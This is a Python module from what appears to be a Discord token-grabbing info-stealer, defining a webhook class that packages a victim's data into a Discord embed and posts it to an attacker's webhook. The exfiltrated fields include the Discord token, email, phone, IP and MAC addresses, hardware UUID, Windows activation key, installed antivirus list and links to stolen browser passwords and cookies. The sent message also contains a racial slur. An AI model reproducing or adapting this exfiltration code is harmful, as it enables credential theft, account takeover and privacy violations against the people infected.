import json

import requests

from webhook.embed import Embed
from hardware.Hardware import Hardware
from target.cookies import Cookie
from target.passwords import Password
from target.steam import SteamAccount, SteamRemoteClient
from checks.discord import DiscordUser, ConvertNitro, ConvertBadges
from checks.roblox import RobloxUser

from typing import List


class Webhook:
    def __init__(self, webhook):
        if not self.CheckWebhook(webhook):
            raise ConnectionError("Invalid webhook")
        self.webhook = webhook

    @staticmethod
    def CheckWebhook(webhook):
        r = requests.get(webhook)
        return r.status_code == 200

    def SendWebhook(self, username: str = None, message: str = None, avatar_url: str = None, embed: Embed = None):
        embeds = []
        if embed is not None:
            embeds.append(embed.__dict__)
        payload = {
            "username": username,
            "content": message,
            "avatar_url": avatar_url,
            "embeds": embeds
        }
        print(json.dumps(payload))
        r = requests.post(self.webhook, json=payload)
        if r.status_code != 204:
            raise ConnectionError(r.json())

    def DiscordAccountWebhook(self, discord: DiscordUser, hardware: Hardware, links: List[str]):
        badges = ""

        embed = Embed()
        embed.setTitle(":swan::hand_splayed:")
        embed.setColor(151, 139, 255)
        embed.setAuthor(f"{discord.username}#{discord.discriminator} ({discord.id})", f"https://cdn.discordapp.com/avatars/{discord.id}/{discord.avatar}.png")

        embed.setDescription(f"__**Biography**__\n{discord.bio}")
        embed.addField("**Mail**", f"`{discord.email}`", True)
        embed.addField("**Phone**", f"`{discord.phone}`", True)
        embed.addField("**Language**", f"`{discord.locale}`", True)

        embed.addField("**Nitro Subscription**", f"`{ConvertNitro(discord.premium_type)}`", False)

        embed.addField("**Badges**", badges, False)

        embed.addField("**Public IP**", f"`{hardware.PublicIP}`", True)
        embed.addField("**Local IPs**", f"`{hardware.PrivateIP}`", True)
        embed.addField("**MAC Address**", f"`{hardware.MAC}`", True)
        embed.addField("**CPU Info**", f"`{hardware.CPU}`", True)
        embed.addField("**UUID**", f"`{hardware.UUID}`", True)
        embed.addField("**Activation Key**", f"`{hardware.ActivationKey}`", True)

        embed.addField("**AntiViruses**", f"```\n" + '\n'.join(hardware.AntiViruses) + "\n```", False)

        embed.addField("**Browsers Details**", f"```\nPasswords: {links[0]}\nCookies: {links[1]}\n```")

        embed.addField("**Payment Sources**", f"`{len(discord.paymentsrc)}`", True)
        embed.addField("**Friends**", f"`{len(discord.friends)}`", True)
        embed.addField("**Connections**", f"`{len(discord.conections)}`", True)

        embed.addField("**Token**", f"```\n{discord.token}\n```", False)

        embed.setFooter("Made by TaxMachine", "https://avatars.githubusercontent.com/u/78520042?v=4")

        self.SendWebhook("Toucan Attrapeur", "lol nig", None, embed)
